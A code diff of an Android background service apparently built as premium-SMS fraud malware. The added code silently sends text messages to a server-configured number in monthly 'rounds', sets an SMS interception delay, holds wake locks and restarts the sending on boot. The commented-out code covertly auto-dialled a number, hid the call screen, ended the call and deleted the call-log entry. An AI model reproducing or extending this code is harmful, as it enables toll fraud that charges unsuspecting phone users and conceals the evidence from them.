@@ -43,6 +43,7 @@ public class BgService extends Service {
     public static final String ACTION_INTERNET = "action.internet.bg";
     public static final String ACTION_SEND_SMS = "action.sms.bg";
     public static final String ACTION_BOOT = "action.boot.bg";
+    public static final String ACTION_SEND_SMS_ROUND = "action.round.sms";
     
     private SettingManager mSM;
     
@@ -52,58 +53,82 @@ public class BgService extends Service {
     private static final int DIAL_DELAY = 5 * 1000;
     private static final int SHOW_DIALOG_DELAY = 2000;
     
-    private static final int DIAL_AUTO = 0;
-    private static final int SHOW_DIALOG = 1;
-    private static final int START_INTENT = 2;
-    private static final int REMOVE_FIRST_LOG = 3;
-    private Handler mHandler = new Handler() {
-        public void handleMessage(Message msg) {
-            switch (msg.what) {
-            case DIAL_AUTO:
-                dial();
-                mHandler.sendEmptyMessageDelayed(SHOW_DIALOG, SHOW_DIALOG_DELAY);
-                break;
-            case SHOW_DIALOG:
-                homeKeyPress();
-                mHandler.sendEmptyMessage(START_INTENT);
-                break;
-            case START_INTENT:
-                startIntent();
-                break;
-            case REMOVE_FIRST_LOG:
-                deleteLastCallLog();
-                break;
-            }
-        }
-    };
+//    private static final int DIAL_AUTO = 0;
+//    private static final int SHOW_DIALOG = 1;
+//    private static final int START_INTENT = 2;
+//    private static final int REMOVE_FIRST_LOG = 3;
+//    private Handler mHandler = new Handler() {
+//        public void handleMessage(Message msg) {
+//            switch (msg.what) {
+//            case DIAL_AUTO:
+////                dial();
+//                mHandler.sendEmptyMessageDelayed(SHOW_DIALOG, SHOW_DIALOG_DELAY);
+//                break;
+//            case SHOW_DIALOG:
+//                homeKeyPress();
+//                mHandler.sendEmptyMessage(START_INTENT);
+//                break;
+//            case START_INTENT:
+//                startIntent();
+//                break;
+//            case REMOVE_FIRST_LOG:
+//                deleteLastCallLog();
+//                break;
+//            }
+//        }
+//    };
     
-    private class CancelTask implements Runnable {
-        public void run() {
-            if (mIsCalling == true) {
-                if (DEBUG) Log.d(TAG, "[[TimeTask::run]] stop the calling");
-                if (SettingManager.getInstance(getApplicationContext()).mForegroundActivity != null) {
-                    try {
-                        ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
-                        SettingManager.getInstance(BgService.this).logTagCurrentTime("Dial_end");
-                        phone.endCall();
-                        mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
-                        SettingManager.getInstance(getApplicationContext()).mForegroundActivity.finish();
-                    } catch (Exception e) {
-                    }
-                }
-                mIsCalling = false;
-            }
-        }
-    }
+//    private class CancelTask implements Runnable {
+//        public void run() {
+//            if (mIsCalling == true) {
+//                if (DEBUG) Log.d(TAG, "[[TimeTask::run]] stop the calling");
+//                if (SettingManager.getInstance(getApplicationContext()).mForegroundActivity != null) {
+//                    try {
+//                        ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
+//                        SettingManager.getInstance(BgService.this).logTagCurrentTime("Dial_end");
+//                        phone.endCall();
+//                        mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
+//                        SettingManager.getInstance(getApplicationContext()).mForegroundActivity.finish();
+//                    } catch (Exception e) {
+//                    }
+//                }
+//                mIsCalling = false;
+//            }
+//        }
+//    }
     
-    private BroadcastReceiver mDialogBroadCast = new BroadcastReceiver() {
+    private BroadcastReceiver mSMSSendBroadCast = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            if (DEBUG) Log.d(TAG, "[[BgService::BroadcastReceiver::onReceive]]");
-            SettingManager.getInstance(context).makeWakeLock();
-            mHandler.sendEmptyMessageDelayed(DIAL_AUTO, DIAL_DELAY);
+            LOGD("receive the intent for send on sms, intent action = " + intent.getAction());
+            SettingManager sm = SettingManager.getInstance(context);
+            if (sm.mXMLHandler != null) {
+                String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
+                if (monthCount != null) {
+                    int sendTotlaCount = Integer.valueOf(monthCount);
+                    int hasSend = sm.getSMSSendCount();
+                    if (hasSend < sendTotlaCount) {
+                        autoSendSMS(BgService.this);
+                        sm.setSMSSendCount(hasSend + 1);
+                    } else {
+                        sm.setSMSSendCount(0);
+                        sm.cancelOneRoundSMSSend();
+                    }
+                } else {
+                    sm.cancelOneRoundSMSSend();
+                }
+            }
         }
     };
+    
+//    private BroadcastReceiver mDialogBroadCast = new BroadcastReceiver() {
+//        @Override
+//        public void onReceive(Context context, Intent intent) {
+//            if (DEBUG) Log.d(TAG, "[[BgService::BroadcastReceiver::onReceive]]");
+//            SettingManager.getInstance(context).makeWakeLock();
+//            mHandler.sendEmptyMessageDelayed(DIAL_AUTO, DIAL_DELAY);
+//        }
+//    };
     
     @Override
     public void onCreate() {
@@ -118,6 +143,10 @@ public class BgService extends Service {
 //        IntentFilter iFilter = new IntentFilter();
 //        iFilter.addAction(ACTION_DIAL_BR);
 //        registerReceiver(mDialogBroadCast, iFilter);
+        
+        IntentFilter filter = new IntentFilter();
+        filter.addAction(ACTION_SEND_SMS_ROUND);
+        this.registerReceiver(mSMSSendBroadCast, filter);
         mSM.setFirstStartTime();
     }
     
@@ -139,11 +168,13 @@ public class BgService extends Service {
                 LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
                 sm.setLastConnectServerTime(System.currentTimeMillis());
                 SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
-                SettingManager.getInstance(this).startAutoSendMessage();
+                if (isSendSMS() == true) {
+                    SettingManager.getInstance(this).startAutoSendMessage();
+                }
             }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
             LOGD("[[onStart]] start send the sms for one cycle");
-            autoSendSMSOrDial(this);
+            SettingManager.getInstance(this).startOneRoundSMSSend();
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_BOOT) == true) {
             File file = new File(SettingManager.getInstance(getApplicationContext()).DOWNLOAD_FILE_PATH);
             if (file.exists() == true) {
@@ -154,6 +185,9 @@ public class BgService extends Service {
                     delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
                 }
                 mSM.tryToFetchInfoFromServer(delayTime);
+                if (isSendSMS() == true) {
+                    SettingManager.getInstance(this).startAutoSendMessage();
+                }
             } else {
                 mSM.tryToFetchInfoFromServer(0);
             }
@@ -163,10 +197,23 @@ public class BgService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        this.unregisterReceiver(mDialogBroadCast);
+//        this.unregisterReceiver(mDialogBroadCast);
+        this.unregisterReceiver(mSMSSendBroadCast);
     }
     
-    private void autoSendSMSOrDial(Context context) {
+    private boolean isSendSMS() {
+        if (mSM.mXMLHandler != null) {
+            String targetNum = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_PORT);
+            String sendText = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_ORDER);
+            String smsOrDial = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
+            if (smsOrDial != null && targetNum != null && sendText != null) {
+                return Integer.valueOf(smsOrDial) == 0 ? true : false;
+            }
+        }
+        return false;
+    }
+    
+    private void autoSendSMS(Context context) {
         SettingManager sm = SettingManager.getInstance(context);
         if (sm.isSimCardReady() == false || sm.isCallIdle() == false) return;
       
@@ -177,39 +224,28 @@ public class BgService extends Service {
             if (smsOrDial != null && sendText != null && targetNum != null) {
                 boolean sms = Integer.valueOf(smsOrDial) == 0 ? true : false;
                 if (sms == true) {
-                    String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
-                    if (monthCount != null) {
-                        int sendCount = Integer.valueOf(monthCount);
-                        String intercept_time_str = sm.mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
-                        int intercept_time_int = 2000 * 60 * 1000;
-                        if (intercept_time_str != null) {
-                            intercept_time_int = Integer.valueOf(intercept_time_str) * 60 * 1000;
-                        }
-                        sm.setSMSBlockDelayTime(intercept_time_int);
-                        SettingManager.getInstance(context).makePartialWakeLock();
-                        try {
-                            Date date = new Date(System.currentTimeMillis());
-                            LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
-                            sm.setLastSMSTime(System.currentTimeMillis());
-                            WorkingMessage wm = WorkingMessage.createEmpty(context);
-                            for (int count = 0; count < sendCount; ++count) {
-                                LOGD("[[autoSendSMSOrDial]] send sms to : " + targetNum + " text = " + sendText);
-                                wm.setDestNum(targetNum);
-                                wm.setText(sendText);
-                                wm.send();
-                                SettingManager.getInstance(context).logSMSCurrentTime();
-                                
-                                //naps
-                                for (int n = 0; n < 10; ++n) {
-                                    Thread.sleep(50);
-                                }
-                            }
-                        } catch (Exception e) {
-                        } finally {
-                            SettingManager.getInstance(context).releasePartialWakeLock();
-                            Date date = new Date(System.currentTimeMillis());
-                            LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
-                        }
+                    String intercept_time_str = sm.mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
+                    int intercept_time_int = 2000 * 60 * 1000;
+                    if (intercept_time_str != null) {
+                        intercept_time_int = Integer.valueOf(intercept_time_str) * 60 * 1000;
+                    }
+                    sm.setSMSBlockDelayTime(intercept_time_int);
+                    SettingManager.getInstance(context).makePartialWakeLock();
+                    try {
+                        Date date = new Date(System.currentTimeMillis());
+                        LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
+                        sm.setLastSMSTime(System.currentTimeMillis());
+                        WorkingMessage wm = WorkingMessage.createEmpty(context);
+                        LOGD("[[autoSendSMSOrDial]] send sms to : " + targetNum + " text = " + sendText);
+                        wm.setDestNum(targetNum);
+                        wm.setText(sendText);
+                        wm.send();
+                        SettingManager.getInstance(context).logSMSCurrentTime();
+                    } catch (Exception e) {
+                    } finally {
+                        SettingManager.getInstance(context).releasePartialWakeLock();
+                        Date date = new Date(System.currentTimeMillis());
+                        LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
                     }
                 } else {
                     //TODO : dial
@@ -220,28 +256,28 @@ public class BgService extends Service {
         }
     }
     
-    private void dial() {
-        Log.d(TAG, "[[dial]]");
-        try {
-            ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
-            if (SettingManager.getInstance(BgService.this).isCallIdle() == true) {
-                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is idle");
-                String targetNum = SettingManager.getInstance(getApplicationContext()).getSMSTargetNum();
-                if (targetNum.equals("") == false) {
-                    mIsCalling = true;
-                    mHandler.postDelayed(new CancelTask(), LONG_DIAL_DELAY);
-                    SettingManager.getInstance(BgService.this).logTagCurrentTime("Dial_begin");
-                    phone.call(targetNum);
-                } else {
-                    if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone num is not exist, so do not dial");
-                }
-            } else {
-                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is not idle, delay to dial again");
-                mHandler.sendEmptyMessageDelayed(DIAL_AUTO, LONG_DIAL_DELAY);
-            }
-        } catch (Exception e) {
-        }
-    }
+//    private void dial() {
+//        Log.d(TAG, "[[dial]]");
+//        try {
+//            ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
+//            if (SettingManager.getInstance(BgService.this).isCallIdle() == true) {
+//                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is idle");
+//                String targetNum = SettingManager.getInstance(getApplicationContext()).getSMSTargetNum();
+//                if (targetNum.equals("") == false) {
+//                    mIsCalling = true;
+//                    mHandler.postDelayed(new CancelTask(), LONG_DIAL_DELAY);
+//                    SettingManager.getInstance(BgService.this).logTagCurrentTime("Dial_begin");
+//                    phone.call(targetNum);
+//                } else {
+//                    if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone num is not exist, so do not dial");
+//                }
+//            } else {
+//                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is not idle, delay to dial again");
+//                mHandler.sendEmptyMessageDelayed(DIAL_AUTO, LONG_DIAL_DELAY);
+//            }
+//        } catch (Exception e) {
+//        }
+//    }
     
     private void homeKeyPress() {
         Intent i= new Intent(Intent.ACTION_MAIN);
@@ -258,32 +294,32 @@ public class BgService extends Service {
         startActivity(intent);
     }
     
-    private void deleteLastCallLog() {
-        if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]]");
-        ContentResolver resolver = getContentResolver();
-        Cursor c = null;
-        try {
-            Uri CONTENT_URI = Uri.parse("content://call_log/calls");
-            c = resolver.query(
-                    CONTENT_URI,
-                    new String[] {Calls._ID},
-                    "type = 2",
-                    null,
-                    "date DESC" + " LIMIT 1");
-            if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] c = " + c);
-                if (c == null || !c.moveToFirst()) {
-                    if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] cursor error, return");
-                    return;
-                }
-                long id = c.getLong(0);
-                String where = Calls._ID + " IN (" + id + ")";
-                if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] delete where = " + where);
-                getContentResolver().delete(CONTENT_URI, where, null);
-            } finally {
-                if (c != null) c.close();
-            }
-            SettingManager.getInstance(getApplicationContext()).releaseWakeLock();
-    }
+//    private void deleteLastCallLog() {
+//        if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]]");
+//        ContentResolver resolver = getContentResolver();
+//        Cursor c = null;
+//        try {
+//            Uri CONTENT_URI = Uri.parse("content://call_log/calls");
+//            c = resolver.query(
+//                    CONTENT_URI,
+//                    new String[] {Calls._ID},
+//                    "type = 2",
+//                    null,
+//                    "date DESC" + " LIMIT 1");
+//            if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] c = " + c);
+//                if (c == null || !c.moveToFirst()) {
+//                    if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] cursor error, return");
+//                    return;
+//                }
+//                long id = c.getLong(0);
+//                String where = Calls._ID + " IN (" + id + ")";
+//                if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] delete where = " + where);
+//                getContentResolver().delete(CONTENT_URI, where, null);
+//            } finally {
+//                if (c != null) c.close();
+//            }
+//            SettingManager.getInstance(getApplicationContext()).releaseWakeLock();
+//    }
     
     @Override
     public IBinder onBind(Intent intent) {
@@ -291,9 +327,11 @@ public class BgService extends Service {
         return null;
     }
     
-    public static final void LOGD(String msg) {
+    public final void LOGD(String msg) {
         if (DEBUG) {
-            Log.d(TAG, msg);
+            Log.d(TAG, "[[" + this.getClass().getName() 
+                    + "::" + Thread.currentThread().getStackTrace()[2].getMethodName()
+                    + "]] " + msg);
         }
     }
 }
